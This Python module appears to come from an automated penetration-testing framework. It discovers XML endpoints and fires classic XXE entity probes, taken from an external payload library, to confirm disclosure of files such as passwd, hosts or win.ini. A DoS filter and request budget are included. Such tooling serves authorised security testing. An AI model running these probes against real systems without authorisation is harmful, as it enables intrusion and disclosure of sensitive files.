from __future__ import annotations

import asyncio  # noqa: F401 — phase 3/4 will need it
import logging
import uuid  # noqa: F401 — phase 3/4 will need it
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, ClassVar, List
from urllib.parse import urlparse

from penage.core.actions import Action, ActionType
from penage.core.candidates import CandidateAction
from penage.core.observations import Observation
from penage.core.state import State
from penage.core.tracer import JsonlTracer
from penage.llm.base import LLMClient
from penage.memory.store import MemoryStore
from penage.specialists.base import AsyncSpecialist, SpecialistConfig
from penage.specialists.shared.oob_listener import OobListener
from penage.specialists.shared.xml_utils import (
    XmlSafetyFilter,
    XxeSignalFamily,
    build_classic_payload,
    build_oob_blind_payload,  # noqa: F401 — phase 4 will use it
    build_parameter_entity_payload,  # noqa: F401 — phase 3 will use it
    detect_xxe_markers,
)
from penage.tools.http_backend import HttpBackend

logger = logging.getLogger(__name__)


_DEFAULT_LIBRARY = Path(__file__).resolve().parents[2] / "payloads" / "xxe.yaml"

_SKIP_INPUT_TYPES = frozenset(
    {"hidden", "submit", "reset", "button", "file", "image", "checkbox", "radio", "password"}
)

_XML_CT_HINTS = (
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
)

_XML_PATH_HINTS = (
    "/xml",
    "/soap",
    "/ws",
    "/rpc",
    "/wsdl",
    "/import",
    "/upload",
    "/feed",
    "/rss",
)

_XML_PARAM_HINTS = frozenset(
    {
        "xml",
        "soap",
        "body",
        "data",
        "content",
        "payload",
        "request",
        "envelope",
    }
)


@dataclass(slots=True)
class _XxeTarget:
    url: str
    delivery: str  # "body" | "param"
    parameter: str = ""
    channel: str = "POST"
    content_type: str = "application/xml"


class _BudgetedHttpTool:
    """Caps a specialist's HTTP usage while still bumping the global counters."""

    def __init__(self, inner: HttpBackend, state: State, cap: int) -> None:
        self._inner = inner
        self._state = state
        self._cap = max(0, int(cap))
        self._used = 0

    async def run(self, action: Action) -> Observation:
        if self._used >= self._cap:
            return Observation(ok=False, error="lfi_specialist:budget_exhausted")
        self._used += 1
        self._state.http_requests_used += 1
        self._state.tool_calls_http += 1
        self._state.tool_calls_total += 1
        try:
            return await self._inner.run(action)
        except Exception as exc:  # LEGACY: HTTP boundary
            return Observation(ok=False, error=f"lfi_specialist:http_error:{exc}")

    @property
    def remaining(self) -> int:
        return max(0, self._cap - self._used)


@dataclass(slots=True)
class XxeSpecialist(AsyncSpecialist):
    """AWE-style XXE specialist (phases 1-5).

    In this iteration implemented: Phase 1 only (target discovery).
    Phases 2-5 — NotImplementedError (added in 2.7b-ii, 2.7b-iii,
    2.7c, 2.7d).

    Design note: LLM-based payload mutation intentionally omitted
    for XXE — LLMs reliably generate invalid DTDs; this specialist
    remains purely deterministic + OOB.
    """

    name: ClassVar[str] = "xxe"

    http_tool: HttpBackend | None = None
    llm_client: LLMClient | None = None
    memory: MemoryStore | None = None
    tracer: JsonlTracer | None = None
    oob_listener: OobListener | None = None

    payload_library_path: Path = field(default_factory=lambda: _DEFAULT_LIBRARY)
    max_http_budget: int = 25
    max_targets: int = 3
    min_reserve_http: int = 8
    max_classic_payloads: int = 6
    max_param_entity_payloads: int = 3
    max_oob_payloads: int = 3

    allow_dos: bool = False

    _done: bool = field(default=False, init=False)
    _attempted: set[str] = field(default_factory=set, init=False)
    _findings: list[dict[str, Any]] = field(default_factory=list, init=False)
    _yaml_cache: list[dict[str, Any]] | None = field(default=None, init=False)
    _safety_filter: XmlSafetyFilter = field(init=False)
    _observations: dict[str, list[dict[str, Any]]] = field(
        default_factory=dict, init=False,
    )

    def __post_init__(self) -> None:
        self._safety_filter = XmlSafetyFilter(allow_dos=self.allow_dos)

    def propose(self, state: State, *, config: SpecialistConfig) -> List[CandidateAction]:
        _ = (state, config)
        return []

    async def propose_async(
        self, state: State, *, config: SpecialistConfig
    ) -> List[CandidateAction]:
        if self._done or self.http_tool is None:
            return self._emit_if_any()

        targets = self._discover_targets(state)
        if not targets:
            return []
        if self.max_http_budget < self.min_reserve_http:
            self._note(f"xxe:insufficient_budget cap={self.max_http_budget}")
            return []

        budgeted = _BudgetedHttpTool(self.http_tool, state, cap=self.max_http_budget)
        step = int(getattr(state, "orch_step", 0))

        for target in targets[: self.max_targets]:
            key = f"{target.url}|{target.delivery}|{target.parameter}"
            if key in self._attempted:
                continue
            if budgeted.remaining < self.min_reserve_http:
                self._note(f"xxe:budget_low remaining={budgeted.remaining}")
                break

            host = _host_of(target.url)
            self._trace_phase(1, "target_discovery", step=step, target=target)

            self._trace_phase(
                2, "classic_system_probes", step=step, target=target,
            )
            finding = await self._run_classic_phase(
                target=target,
                http_tool=budgeted,
                host=host,
                config=config,
                step=step,
            )
            if finding and finding.get("verified"):
                self._findings.append(finding)
                self._done = True
                self._attempted.add(key)
                break

            # Phases 3-5 — next sessions.
            self._attempted.add(key)

        return self._emit_if_any()

    def _emit_if_any(self) -> List[CandidateAction]:
        verified = [f for f in self._findings if f.get("verified")]
        if not verified:
            return []
        finding = verified[-1]
        action = Action(
            type=ActionType.NOTE,
            params={"kind": "xxe_finding", "finding": finding},
            tags=[
                "xxe",
                "verified",
                finding.get("family") or finding.get("kind", "unknown"),
            ],
        )
        return [
            CandidateAction(
                action=action,
                source=self.name,
                score=12.0,
                cost=0.0,
                reason=finding.get("summary") or "XXE finding",
                metadata={"evidence": finding},
            )
        ]

    # ------------------------------------------------------------------
    # Phase 1 — target discovery
    # ------------------------------------------------------------------

    def _discover_targets(self, state: State) -> list[_XxeTarget]:
        found: list[_XxeTarget] = []
        seen: set[tuple[str, str, str]] = set()

        # A: recent_http_memory с XML content-type.
        for rec in (getattr(state, "recent_http_memory", None) or []):
            if not isinstance(rec, dict):
                continue
            headers = rec.get("headers") or {}
            ct_raw = ""
            for k, v in (headers.items() if isinstance(headers, dict) else []):
                if str(k).lower() == "content-type":
                    ct_raw = str(v or "").lower()
                    break
            if not any(h in ct_raw for h in _XML_CT_HINTS):
                continue
            url = str(rec.get("url") or "")
            if not url:
                continue
            ct_normalized = next(
                (h for h in _XML_CT_HINTS if h in ct_raw),
                "application/xml",
            )
            key = (url, "body", "")
            if key in seen:
                continue
            seen.add(key)
            found.append(
                _XxeTarget(
                    url=url,
                    delivery="body",
                    parameter="",
                    channel="POST",
                    content_type=ct_normalized,
                )
            )

        # B: URL-path hints.
        candidate_urls: list[str] = []
        last_url = getattr(state, "last_http_url", None)
        if last_url:
            candidate_urls.append(str(last_url))
        for rec in (getattr(state, "recent_http_memory", None) or []):
            if isinstance(rec, dict):
                u = rec.get("url")
                if u:
                    candidate_urls.append(str(u))

        for url in candidate_urls:
            try:
                path = (urlparse(url).path or "").lower()
            except Exception:
                continue
            if not any(h in path for h in _XML_PATH_HINTS):
                continue
            key = (url, "body", "")
            if key in seen:
                continue
            seen.add(key)
            found.append(
                _XxeTarget(
                    url=url,
                    delivery="body",
                    parameter="",
                    channel="POST",
                    content_type="application/xml",
                )
            )

        # C: form-param hints.
        forms_by_url = getattr(state, "forms_by_url", {}) or {}
        for page_url, forms in forms_by_url.items():
            for form in forms or []:
                action_url = str(form.get("action") or page_url or "")
                if not action_url:
                    continue
                method = str(form.get("method") or "POST").upper()
                for inp in (form.get("inputs") or []):
                    name = str(inp.get("name") or "").strip()
                    itype = str(inp.get("type") or "").lower()
                    if not name or itype in _SKIP_INPUT_TYPES:
                        continue
                    if not any(h in name.lower() for h in _XML_PARAM_HINTS):
                        continue
                    key = (action_url, "param", name)
                    if key in seen:
                        continue
                    seen.add(key)
                    found.append(
                        _XxeTarget(
                            url=action_url,
                            delivery="param",
                            parameter=name,
                            channel=method if method in {"POST", "PUT"} else "POST",
                            content_type="application/xml",
                        )
                    )

        return found[: self.max_targets]

    # ------------------------------------------------------------------
    # Phases 2-5 — implemented in subsequent sessions
    # ------------------------------------------------------------------

    async def _run_classic_phase(
        self,
        *,
        target: _XxeTarget,
        http_tool: _BudgetedHttpTool,
        host: str,
        config: SpecialistConfig,
        step: int,
    ) -> dict[str, Any] | None:
        """Phase 2: classic SYSTEM-entity probes.

        Categories used: ``classic-unix``, ``classic-windows``,
        ``error-based``, ``no-doctype-sanity``, ``soap-wrapped``.
        ``parameter_entity-*`` and ``oob_blind-*`` are handled by phases 3/4
        (not yet implemented).

        Returns a verified finding dict on a strong marker hit, ``None``
        otherwise. Per-probe observations (including weak signals) are
        accumulated into ``self._observations`` for phase 5 candidate
        assembly.
        """
        _ = (config, step)
        entries = self._load_yaml_entries(
            categories=(
                "classic-unix",
                "classic-windows",
                "error-based",
                "no-doctype-sanity",
                "soap-wrapped",
            ),
            limit=self.max_classic_payloads,
        )

        key = f"{target.url}|{target.delivery}|{target.parameter}"

        for entry in entries:
            if http_tool.remaining < 2:
                break

            payload = self._render_payload(entry, oob_url=None)
            if payload is None:
                # parameter_entity / oob_blind / incomplete entry — skip.
                continue

            verdict = self._safety_filter.check(payload)
            if not verdict.allowed:
                self._note(
                    f"xxe:dos_payload_dropped id={entry.get('id', '?')} "
                    f"reason={verdict.reason}"
                )
                continue

            action_params = self._build_delivery(target, payload, entry)
            action = Action(type=ActionType.HTTP, params=action_params)
            obs = await http_tool.run(action)

            if not obs.ok or not isinstance(obs.data, dict):
                self._record_attempt(
                    host=host,
                    parameter=(target.parameter or "__body__"),
                    payload=payload[:200],
                    outcome="error",
                )
                continue

            body = str(obs.data.get("text_full") or "")
            status = obs.data.get("status_code")
            hits = detect_xxe_markers(body)

            self._observations.setdefault(key, []).append(
                {
                    "payload_id": entry.get("id", "?"),
                    "status": status,
                    "body_excerpt": body[:300],
                    "xml_parse_error": any(
                        h.family == XxeSignalFamily.XML_PARSE_ERROR
                        for h in hits
                    ),
                    "hits": [h.family.value for h in hits],
                }
            )

            strong_families = {
                XxeSignalFamily.UNIX_PASSWD,
                XxeSignalFamily.UNIX_HOSTS,
                XxeSignalFamily.WIN_INI,
                XxeSignalFamily.WIN_HOSTS,
                XxeSignalFamily.ENTITY_EXPANSION,
            }
            strong_hit = next(
                (h for h in hits if h.family in strong_families), None
            )
            if strong_hit is not None:
                self._record_attempt(
                    host=host,
                    parameter=(target.parameter or "__body__"),
                    payload=payload[:200],
                    outcome="verified_classic",
                )
                return {
                    "verified": True,
                    "kind": "xxe_classic_disclosure",
                    "mode": "classic",
                    "delivery": target.delivery,
                    "parameter": target.parameter,
                    "payload_id": entry.get("id", "?"),
                    "channel": target.channel,
                    "url": target.url,
                    "family": strong_hit.family.value,
                    "evidence": {
                        "markers": [
                            {
                                "family": h.family.value,
                                "marker": h.marker,
                                "snippet": h.snippet,
                            }
                            for h in hits[:5]
                        ],
                        "response_excerpt": body[:500],
                        "http_status": status,
                        "content_type": target.content_type,
                        "yaml_id": entry.get("id", "?"),
                    },
                    "summary": (
                        f"XXE disclosure of {strong_hit.family.value} "
                        f"via {target.delivery}="
                        f"{target.parameter or 'body'}"
                    ),
                }

            self._record_attempt(
                host=host,
                parameter=(target.parameter or "__body__"),
                payload=payload[:200],
                outcome="no_signal",
            )

        return None

    async def _run_param_entity_phase(self, *args: Any, **kwargs: Any) -> dict[str, Any] | None:
        raise NotImplementedError("Implemented in 2.7c")

    async def _run_oob_phase(self, *args: Any, **kwargs: Any) -> dict[str, Any] | None:
        raise NotImplementedError("Implemented in 2.7c")

    def _finalize_candidate(self, *args: Any, **kwargs: Any) -> dict[str, Any] | None:
        raise NotImplementedError("Implemented in 2.7d")

    def _render_payload(
        self, entry: dict[str, Any], *, oob_url: str | None
    ) -> str | None:
        """Render a yaml entry into a ready-to-send XML string.

        Dispatches on the entry's ``template`` field, with ``category``
        taking precedence for ``soap-wrapped``, ``error-based``, and
        ``no-doctype-sanity`` — these categories describe the *structural
        delivery shell* rather than the raw template family, and the yaml
        encodes them in ``category`` while keeping ``template`` at the
        underlying shape (usually ``classic``).

        Returns ``None`` for ``parameter_entity`` / ``oob_blind`` templates
        (handled by phases 3/4) and for entries that lack the data required
        to render (e.g. empty URI).
        """
        _ = oob_url
        category = str(entry.get("category") or "")
        if category in {"soap-wrapped", "error-based", "no-doctype-sanity"}:
            template_kind = category
        else:
            template_kind = str(entry.get("template") or "classic")

        uri = str(entry.get("uri") or "")
        entity_name = str(entry.get("entity_name") or "xxe")

        if template_kind == "oob_blind":
            return None  # phase 4.
        if template_kind == "parameter_entity":
            return None  # phase 3.

        if template_kind == "classic":
            if not uri:
                return None
            return build_classic_payload(uri, entity_name=entity_name)

        if template_kind == "soap-wrapped":
            if not uri:
                return None
            inner = build_classic_payload(uri, entity_name=entity_name)
            # Drop the <?xml ...?> declaration from the inner body; the
            # outer envelope carries its own.
            if "?>" in inner:
                inner = inner.split("?>\n", 1)[-1]
            return (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
                '  <soap:Body>\n'
                f'    {inner}\n'
                '  </soap:Body>\n'
                '</soap:Envelope>'
            )

        if template_kind == "error-based":
            raw = entry.get("payload")
            if raw:
                out = str(raw)
                out = out.replace("{URI}", uri)
                out = out.replace("{ENTITY_NAME}", entity_name)
                return out
            if uri:
                return build_classic_payload(uri, entity_name=entity_name)
            return None

        if template_kind == "no-doctype-sanity":
            return '<?xml version="1.0"?>\n<root>ok</root>'

        return None

    def _build_delivery(
        self,
        target: _XxeTarget,
        xml_payload: str,
        entry: dict[str, Any],
    ) -> dict[str, Any]:
        """Assemble the ``action.params`` dict for ``http_tool``.

        For ``delivery="body"`` the XML string rides as the raw request
        body with a matching Content-Type. For ``delivery="param"`` the
        XML string is assigned to a form field; httpx picks the
        form-urlencoded Content-Type automatically.
        """
        ct = str(
            entry.get("content_type")
            or target.content_type
            or "application/xml"
        )
        channel = target.channel.upper() if target.channel else "POST"
        if channel not in {"POST", "PUT"}:
            channel = "POST"

        if target.delivery == "body":
            return {
                "method": channel,
                "url": target.url,
                "data": xml_payload,
                "headers": {"Content-Type": ct},
            }

        return {
            "method": channel,
            "url": target.url,
            "data": {target.parameter: xml_payload},
        }

    # ------------------------------------------------------------------
    # Helpers (structurally aligned with LfiSpecialist)
    # ------------------------------------------------------------------

    def _load_yaml_entries(
        self,
        *,
        categories: tuple[str, ...],
        limit: int,
    ) -> list[dict[str, Any]]:
        """Load and filter payload entries from ``xxe.yaml``.

        Returns up to ``limit`` entries whose ``category`` is in ``categories``.
        The full library is cached on the instance to avoid re-parsing the file
        between phases. Missing YAML / parse errors yield an empty list — the
        specialist degrades to a no-op rather than crashing.
        """
        if self._yaml_cache is None:
            self._yaml_cache = _load_xxe_library(self.payload_library_path)
        allowed = set(categories)
        out: list[dict[str, Any]] = []
        for entry in self._yaml_cache:
            if entry.get("category") not in allowed:
                continue
            # An entry is usable if it carries either a URI (rendered from a
            # template) or an explicit raw ``payload`` string (error-based).
            if not str(entry.get("uri") or "") and not str(entry.get("payload") or ""):
                continue
            out.append(entry)
            if len(out) >= max(0, int(limit)):
                break
        return out

    def _record_attempt(
        self, *, host: str, parameter: str, payload: str, outcome: str
    ) -> None:
        if self.memory is None:
            return
        try:
            self.memory.record_attempt(
                episode_id=self._episode_id(),
                host=host,
                parameter=parameter,
                payload=payload,
                outcome=outcome,
            )
        except Exception as exc:
            logger.warning("xxe memory record_attempt failed: %s", exc)

    def _trace_phase(
        self,
        phase_num: int,
        name: str,
        *,
        step: int,
        target: _XxeTarget,
        extra: dict[str, Any] | None = None,
    ) -> None:
        if self.tracer is None:
            return
        payload: dict[str, Any] = {
            "specialist": self.name,
            "phase": phase_num,
            "phase_name": name,
            "step": step,
            "url": target.url,
            "parameter": target.parameter,
            "channel": target.channel,
            "delivery": target.delivery,
            "content_type": target.content_type,
        }
        if extra:
            payload.update(extra)
        try:
            self.tracer.write_event("specialist_phase", payload)
        except Exception as exc:
            logger.warning("xxe tracer write failed: %s", exc)

    def _note(self, text: str) -> None:
        if self.tracer is None:
            return
        try:
            self.tracer.record_note(text)
        except Exception as exc:
            logger.warning("xxe tracer note failed: %s", exc)

    def _episode_id(self) -> str:
        if self.tracer is not None:
            return str(self.tracer.episode_id)
        return "no-episode"


def _load_xxe_library(path: Path) -> list[dict[str, Any]]:
    try:
        import yaml  # noqa: WPS433 — keep yaml soft-optional
    except ImportError as exc:
        logger.warning("PyYAML not installed (%s); xxe library unavailable", exc)
        return []
    if not path.exists():
        logger.warning("xxe library missing at %s", path)
        return []
    try:
        raw = yaml.safe_load(path.read_text(encoding="utf-8")) or []
    except Exception as exc:
        logger.warning("failed to parse xxe library %s: %s", path, exc)
        return []
    if not isinstance(raw, list):
        return []
    entries: list[dict[str, Any]] = []
    for item in raw:
        if not isinstance(item, dict):
            continue
        entries.append(
            {
                "id": str(item.get("id") or ""),
                "category": str(item.get("category") or ""),
                "template": str(item.get("template") or ""),
                "uri": str(item.get("uri") or ""),
                "entity_name": str(item.get("entity_name") or ""),
                "content_type": str(item.get("content_type") or ""),
                "family": str(item.get("family") or ""),
                "payload": str(item.get("payload") or ""),
                "expected_markers": list(item.get("expected_markers") or []),
                "notes": str(item.get("notes") or ""),
            }
        )
    return entries


def _host_of(url: str) -> str:
    try:
        return (urlparse(url).netloc or "").lower()
    except Exception:
        return ""


__all__ = ["XxeSpecialist"]
